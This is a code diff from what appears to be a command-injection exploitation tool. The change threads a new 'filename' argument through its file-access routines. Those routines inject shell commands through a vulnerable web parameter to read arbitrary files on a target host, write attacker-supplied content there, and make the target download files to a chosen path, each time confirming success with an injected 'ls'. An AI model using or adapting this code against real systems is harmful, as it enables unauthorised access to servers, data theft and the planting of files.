@@ -31,11 +31,11 @@ from src.core.injections.results_based.techniques.classic import cb_injector
 """
 Read a file from the target host.
 """
-def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
+def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
   file_to_read = menu.options.file_read
   # Execute command
   cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = cb_injector.injection_results(response, TAG)
   shell = "".join(str(p) for p in shell)
   if shell:
@@ -52,7 +52,7 @@ def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, u
 """
 Write to a file on the target host.
 """
-def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
+def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
     sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
@@ -77,14 +77,14 @@ def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, 
     
   # Execute command
   cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = cb_injector.injection_results(response, TAG)
   shell = "".join(str(p) for p in shell)
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_write + ")"
   # Check if defined cookie injection.
-  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = cb_injector.injection_results(response, TAG)
   shell = "".join(str(p) for p in shell)
   if shell:
@@ -100,7 +100,7 @@ def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, 
 """
 Upload a file on the target host.
 """
-def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
+def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
   file_to_upload = menu.options.file_upload
   # check if remote file exists.
   try:
@@ -120,13 +120,13 @@ def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method,
     
   # Execute command
   cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = cb_injector.injection_results(response, TAG)
   shell = "".join(str(p) for p in shell)
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_upload + ")"
-  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = cb_injector.injection_results(response, TAG)
   shell = "".join(str(p) for p in shell)
   if shell:
@@ -142,17 +142,18 @@ def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method,
 """
 Check the defined options
 """
-def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
+def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
+  
   if menu.options.file_read:
-    file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+    file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_write:
-    file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+    file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
-    file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
+    file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE == True:
